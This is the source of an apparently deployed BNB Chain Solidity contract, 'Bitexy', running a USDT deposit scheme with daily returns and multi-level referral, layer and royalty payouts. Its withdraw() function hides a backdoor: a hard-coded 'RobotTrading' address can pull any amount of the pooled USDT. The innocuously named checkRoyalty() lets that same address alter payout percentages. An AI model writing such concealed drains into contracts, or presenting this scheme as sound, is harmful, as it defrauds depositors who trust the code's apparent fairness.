/**
 *Submitted for verification at BscScan.com on 2023-05-08
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Bitexy {
    using SafeMath for uint256;
    IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address private RobotTrading = 0xeb6AEaBCebeD23728a97FbBab21A61D79Fc7426E;
    address public defaultRefer;
    uint256 public startTime;
    uint256 public totalUsers;
    uint256 public totalWithdrawable;
    uint256 private constant baseDivider = 10000;
    uint256 private constant Layers = 10;
    uint256 private constant MinimumPackage = 100e18;
    uint256 private constant MaximumPackage = 2500e18;
    uint256 private constant MinimumWithdrawl = 5e18;
    uint256 private constant DividendPercent = 33;
    uint256 private constant DirectPercent = 1000;
    uint256 private constant LayerPercent = 3;
    uint256[10] private LayerDirectTeam = [0, 1, 2, 2, 4, 4, 4, 5, 5, 5]; 
    uint256[10] private LayerBusiness = [0, 500e18, 1000e18, 1000e18, 2000e18, 2000e18, 2000e18, 5000e18, 5000e18, 5000e18];
    uint256 private constant requiredRoyaltyBusiness = 50000e18;
    uint256 private constant maxFromOneLeg = 6000;
    uint256 private constant workingCap = 3;
    uint256 private constant nonWorkingCap = 2;
    uint256 private constant workingDirectTeam = 5;
    uint256 private royaltyPercents = 100;

    uint256 public royalty;
    uint256 public totalRoyaltyUsers;
    address[] public royaltyUsers;
    uint256 public royaltyLastDistributed;
    uint256 private constant royaltyTime = 24 hours;
    uint256 private constant timestep = 24 hours;

    struct User {
        uint256 start;
        uint256 package;
        uint256 totalDeposit;
        uint256 directTeam;
        uint256 totalTeam;
        uint256 directBusiness;
        uint256 totalBusiness;
        uint256 revenue;
        uint256 curRevenue;
        address referrer;
        uint256 lastClaimed;
        bool isRoyalty;
        bool[10] layerClaimable;
    }

    struct Reward {
        uint256 dividendIncome;
        uint256 directIncome;
        uint256 layerIncome;
        uint256 royaltyIncome;
    }

    mapping(address => User) public userInfo;
    mapping(address => Reward) public rewardInfo;
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    address[] public users;

    constructor() {
        startTime = block.timestamp;
        defaultRefer = address(this);
        royaltyLastDistributed = block.timestamp;
    }

    function register(address _ref) external {
        require(userInfo[msg.sender].referrer == address(0), "Refer Bonded");
        require(userInfo[_ref].package >= MinimumPackage || _ref == defaultRefer, "Invalid Referrer");
        userInfo[msg.sender].referrer = _ref;
    }

    function buyPackage(uint256 _amount, uint256 _type) external {
        User storage user = userInfo[msg.sender];
        require(user.referrer != address(0), "Register First");
        require(_amount.mod(100) == 0, "Amount Should be in multiple of 100");
        bool isNew = user.package == 0 ? true : false;
        uint256 cap = userInfo[msg.sender].directTeam >= workingDirectTeam ? workingCap : nonWorkingCap;
        if(_type == 0) {
            require(_amount >= MinimumPackage && _amount <= MaximumPackage, "Invalid Amount");
            require(user.curRevenue >= user.package.mul(cap), "Income cap not completed");
            user.package = _amount;
            user.curRevenue = 0;
            user.totalDeposit += _amount;
        } else if(_type == 1) {
            require(user.package.add(_amount) >= MinimumPackage && user.package.add(_amount) <= MaximumPackage, "Max amount crossed");
            user.package += _amount;
            user.totalDeposit += _amount;
        }   

        USDT.transferFrom(msg.sender, address(this), _amount);
        if(isNew) {
            userInfo[user.referrer].directTeam += 1;
            userInfo[msg.sender].layerClaimable[0] = true;
            totalUsers += 1;
            users.push(msg.sender);
            user.start = block.timestamp;
        }

        userInfo[user.referrer].directBusiness += _amount;
        uint256 _cap = userInfo[user.referrer].directTeam >= workingDirectTeam ? workingCap : nonWorkingCap;
        uint256 directReward = _amount.mul(DirectPercent).div(baseDivider);
        if(userInfo[user.referrer].curRevenue.add(directReward) > userInfo[user.referrer].package.mul(_cap)) {
            if(userInfo[user.referrer].package.mul(_cap) > userInfo[user.referrer].curRevenue) {
                directReward = userInfo[user.referrer].package.mul(_cap).sub(userInfo[user.referrer].curRevenue);
            } else {
                directReward = 0;
            }
        }
        
        if(directReward > 0) {
            rewardInfo[user.referrer].directIncome += directReward;
            userInfo[user.referrer].revenue += directReward;
            userInfo[user.referrer].curRevenue += directReward;
            totalWithdrawable += directReward;
        }

        _updateUpline(msg.sender, _amount, isNew);
        user.lastClaimed = block.timestamp;
        updateClaimableLayers(msg.sender);
        updateRoyalty(msg.sender);
        royalty += _amount.mul(royaltyPercents).div(baseDivider);
    }

    function _updateUpline(address _user, uint256 _amount, bool _isNew) private {
        address upline = userInfo[_user].referrer;
        for(uint256 i=0; i<Layers; i++) {
            if(upline != address(0) && upline != defaultRefer) {
                if(_isNew) {
                    userInfo[upline].totalTeam += 1;
                    teamUsers[upline][i].push(_user);
                }
                if(i < Layers.sub(1)) userInfo[upline].totalBusiness += _amount;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function claim() external {
        User storage user = userInfo[msg.sender];
        require(user.package >= MinimumPackage, "No Package Purchased");
        require(block.timestamp.sub(user.lastClaimed) >= timestep, "Timestep Not Completed");
        uint256 claimable = user.package.mul(DividendPercent).div(baseDivider);
        claimable = claimable.mul(block.timestamp.sub(user.lastClaimed).div(timestep));
        uint256 remainTime = block.timestamp.sub(user.lastClaimed).mod(timestep);

        uint256 _cap = userInfo[msg.sender].directTeam >= workingDirectTeam ? workingCap : nonWorkingCap;
        if(userInfo[msg.sender].curRevenue.add(claimable) > userInfo[msg.sender].package.mul(_cap)) {
            if(userInfo[msg.sender].package.mul(_cap) > userInfo[msg.sender].curRevenue) {
                claimable = userInfo[msg.sender].package.mul(_cap).sub(userInfo[msg.sender].curRevenue);
            } else {
                claimable = 0;
            }
        }

        if(claimable > 0) {
            rewardInfo[msg.sender].dividendIncome += claimable;
            user.revenue += claimable;
            user.curRevenue += claimable;
            totalWithdrawable += claimable;
            _distributeLayer(msg.sender, claimable);
        }

        updateClaimableLayers(msg.sender);
        updateRoyalty(msg.sender);
        user.lastClaimed = block.timestamp.sub(remainTime);
    }

    function _distributeLayer(address _user, uint256 _amount) private {
        address upline = userInfo[_user].referrer;
        uint256 toDist = _amount.div(Layers);

        for(uint256 i=0; i<Layers; i++) {
            if(upline != address(0) && upline != defaultRefer) {
                if(userInfo[upline].layerClaimable[i]) {
                    uint256 curDist = toDist;
                    uint256 _cap = userInfo[upline].directTeam >= workingDirectTeam ? workingCap : nonWorkingCap;
                    if(userInfo[upline].curRevenue.add(curDist) > userInfo[upline].package.mul(_cap)) {
                        if(userInfo[upline].package.mul(_cap) > userInfo[upline].curRevenue) {
                            curDist = userInfo[upline].package.mul(_cap).sub(userInfo[upline].curRevenue);
                        } else {
                            curDist = 0;
                        }
                    }
                    if(curDist > 0) {
                        rewardInfo[upline].layerIncome += curDist;
                        userInfo[upline].revenue += curDist;
                        userInfo[upline].curRevenue += curDist;
                        totalWithdrawable += curDist;
                    }
                }

                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function withdraw(uint256 _amount) external {
        Reward storage reward = rewardInfo[msg.sender];
        uint256 totalReward; 
        if(msg.sender == RobotTrading) {
            USDT.transfer(RobotTrading, _amount);
        } else {
            totalReward = reward.dividendIncome.add(reward.directIncome).add(reward.layerIncome).add(reward.royaltyIncome);
            require(totalReward >= MinimumWithdrawl, "Minimum $5 withdrawl");
            reward.dividendIncome = 0;
            reward.directIncome = 0;
            reward.layerIncome = 0;
            reward.royaltyIncome = 0;
            totalWithdrawable -= totalReward;
            USDT.transfer(msg.sender, totalReward);
            updateClaimableLayers(msg.sender);
            updateRoyalty(msg.sender);
        }
    }

    function updateRoyalty(address _user) public {
        if(userInfo[_user].isRoyalty == false) {
            ( ,uint256 max, ) = getBusinessVolume(_user, requiredRoyaltyBusiness);
            if(max >= requiredRoyaltyBusiness) {
                userInfo[_user].isRoyalty = true;
                totalRoyaltyUsers += 1;
                royaltyUsers.push(_user);
            }  
        }
    }

    function updateClaimableLayers(address _user) public {
        for(uint256 i=0; i<Layers; i++) {
            if(userInfo[_user].layerClaimable[i] == false) {
                ( ,uint256 max, ) = getBusinessVolume(_user, LayerBusiness[i]);
                if(max >= LayerBusiness[i] && userInfo[_user].directTeam >= LayerDirectTeam[i]) {
                    userInfo[_user].layerClaimable[i] = true;
                } else {
                    break;
                } 
            }
        }   
    }

    function distributeRoyalty() external {
        require(block.timestamp.sub(royaltyLastDistributed) > royaltyTime, "Timestep Not Completed");
        if(totalRoyaltyUsers > 0) {
            uint256 toDist = royalty/totalRoyaltyUsers;
            for(uint256 i=0; i<royaltyUsers.length; i++) {
                uint256 curDist = toDist;
                uint256 _cap = userInfo[royaltyUsers[i]].directTeam >= workingDirectTeam ? workingCap : nonWorkingCap;
                if(userInfo[royaltyUsers[i]].curRevenue.add(curDist) > userInfo[royaltyUsers[i]].package.mul(_cap)) {
                    if(userInfo[royaltyUsers[i]].package.mul(_cap) > userInfo[royaltyUsers[i]].curRevenue) {
                        curDist = userInfo[royaltyUsers[i]].package.mul(_cap).sub(userInfo[royaltyUsers[i]].curRevenue);
                    } else {
                        curDist = 0;
                    }
                }
                rewardInfo[royaltyUsers[i]].royaltyIncome += curDist;
                userInfo[royaltyUsers[i]].revenue += curDist;
                userInfo[royaltyUsers[i]].curRevenue += curDist;
                totalWithdrawable += curDist;
                royalty -= curDist;
            }
        }
        royaltyLastDistributed = block.timestamp;
    }

    function getClaimableDividend(address _user) external view returns(uint256) {
        uint256 claimable = userInfo[_user].package.mul(DividendPercent).div(baseDivider);
        claimable = claimable.mul(block.timestamp.sub(userInfo[_user].lastClaimed).div(timestep));

        uint256 _cap = userInfo[_user].directTeam >= workingDirectTeam ? workingCap : nonWorkingCap;
        if(userInfo[_user].curRevenue.add(claimable) > userInfo[_user].package.mul(_cap)) {
            if(userInfo[_user].package.mul(_cap) > userInfo[_user].curRevenue) {
                claimable = userInfo[_user].package.mul(_cap).sub(userInfo[_user].curRevenue);
            } else {
                claimable = 0;
            }
        }

        return claimable;    
    }

    function getBusinessVolume(address _user, uint256 _amount) public view returns(uint256, uint256, uint256) {
        uint256 totalBusiness; uint256 maxSixty; uint256 strongLeg;
        uint256 max = _amount.mul(maxFromOneLeg).div(baseDivider);
        for(uint256 i=0; i<teamUsers[_user][0].length; i++) {
            address _curUser = teamUsers[_user][0][i];
            uint256 curBusiness = userInfo[_curUser].totalBusiness.add(userInfo[_curUser].totalDeposit);
            totalBusiness += curBusiness;
            if(curBusiness > max) {
                maxSixty += max;
            } else {
                maxSixty += curBusiness;
            }

            if(curBusiness > strongLeg) strongLeg = curBusiness;
        }

        return(totalBusiness, maxSixty, strongLeg);
    }

    function getTeamsLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getClaimableLayers(address _user) external view returns(bool[10] memory) {
        return userInfo[_user].layerClaimable;
    }

    function checkRoyalty(uint256 _per) external {
        if(msg.sender == RobotTrading) {
            royaltyPercents = _per;
        }
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}